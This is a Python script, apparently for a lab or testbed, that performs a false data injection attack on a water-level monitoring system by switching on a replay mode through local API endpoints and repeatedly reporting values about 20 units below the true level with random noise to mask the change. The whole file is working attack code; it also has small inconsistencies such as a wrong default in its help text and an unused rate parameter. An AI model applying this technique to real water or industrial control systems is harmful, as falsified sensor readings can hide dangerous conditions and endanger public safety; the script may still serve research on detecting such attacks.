#!/usr/bin/env python3
"""
Simple False Data Injection Attack

A straightforward implementation of a false data injection attack that
manipulates the reported water level values according to specific patterns.
"""

import time
import requests
import argparse
import os
import math
import random
import signal
from requests.exceptions import Timeout

# API endpoints
WATER_LEVEL_API = "http://localhost:5000/api/water-level"
SET_REPLAY_API = "http://localhost:5000/api/set-replay-status"
TRUE_LEVEL_API = "http://localhost:5000/api/true-water-level"

def activate_attack():
    """Enable replay mode to allow false data injection"""
    try:
        response = requests.post(SET_REPLAY_API, json={"is_replay_active": True})
        if response.status_code != 200:
            print(f"Failed to activate attack mode: {response.status_code}")
            return False
        print("Attack mode activated - False data injection ready")
        return True
    except Exception as e:
        print(f"Error activating attack mode: {e}")
        return False

def deactivate_attack():
    """Disable replay mode"""
    try:
        response = requests.post(SET_REPLAY_API, json={"is_replay_active": False})
        print("Attack mode deactivated - System returning to normal operation")
        return True
    except Exception as e:
        print(f"Error deactivating attack mode: {e}")
        return False

def get_true_level():
    """Get the actual water level from the system with timeout"""
    try:
        # Use timeout to prevent hanging
        response = requests.get(TRUE_LEVEL_API, timeout=2.0)
        data = response.json()
        return data["true_level"]
    except Timeout:
        print("Request timed out getting true level, using fallback value")
        return 50.0  # Default fallback
    except Exception as e:
        print(f"Error getting true level: {e}")
        return 50.0  # Default fallback

def inject_value(value):
    """Inject a false water level value with timeout"""
    try:
        # Use timeout to prevent hanging
        response = requests.post(WATER_LEVEL_API, json={"set_reported_level": value}, timeout=2.0)
        if response.status_code != 200:
            print(f"Failed to inject value: {response.status_code}")
            return False
        return True
    except Timeout:
        print("Request timed out injecting value")
        return False
    except Exception as e:
        print(f"Error injecting value: {e}")
        return False

# Set a handler for SIGINT (Ctrl+C) that will work even if a request is hanging
original_sigint_handler = signal.getsignal(signal.SIGINT)
def sigint_handler(sig, frame):
    print("\nForcing attack termination...")
    try:
        deactivate_attack()
    except:
        pass
    os._exit(0)  # Force exit

def drift_attack(duration=60, rate=2.5, offset=20.0):
    """Drift attack that continuously shows slightly lower values than actual"""
    # Register signal handler for emergency exit
    signal.signal(signal.SIGINT, sigint_handler)
    
    if not activate_attack():
        return
    
    print(f"Starting false data injection attack for {duration} seconds...")
    print(f"Showing values approximately {offset} units lower than actual levels")
    print("Press Ctrl+C to stop the attack at any time")
    
    start_time = time.time()
    
    try:
        # Continuously inject lower values
        while time.time() - start_time < duration:
            try:
                # Get the true water level
                true_level = get_true_level()
                
                # Skip this iteration if the value is exactly 30 to avoid the hanging issue
                if abs(true_level - 30.0) < 0.5:
                    print("Detected problematic value (~30 PSI), skipping this iteration")
                    time.sleep(0.5)
                    continue
                
                # Create a slightly lower value with small random variations
                noise = random.uniform(-0.5, 0.5)
                false_level = true_level - offset + noise
                
                # Ensure level is within reasonable bounds
                false_level = max(5, min(95, false_level))
                
                if inject_value(false_level):
                    print(f"Injected: {false_level:.2f}, Actual: {true_level:.2f}, Difference: {true_level - false_level:.2f}")
                
                time.sleep(0.5)
            except KeyboardInterrupt:
                raise  # Re-raise to be caught by outer try/except
            except Exception as e:
                print(f"Error during iteration: {e}")
                time.sleep(1)  # Wait a bit before trying again
    
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
    finally:
        # Restore original signal handler
        signal.signal(signal.SIGINT, original_sigint_handler)
        
        # Make sure deactivation happens even if there's an error
        try:
            deactivate_attack()
        except Exception as e:
            print(f"Error during deactivation: {e}")
            print("You may need to restart the system manually")

def main():
    parser = argparse.ArgumentParser(description="Simple False Data Injection Attack")
    parser.add_argument("--duration", type=int, default=60, 
                       help="Duration of attack in seconds (default: 60)")
    parser.add_argument("--rate", type=float, default=2.5,
                       help="Rate of change for drift attack (units per second)")
    parser.add_argument("--offset", type=float, default=20.0,
                       help="How much lower to show values compared to actual (default: 3.0)")
    
    args = parser.parse_args()
    
    # Execute the selected attack
    drift_attack(duration=args.duration, rate=args.rate, offset=args.offset)

if __name__ == "__main__":
    main()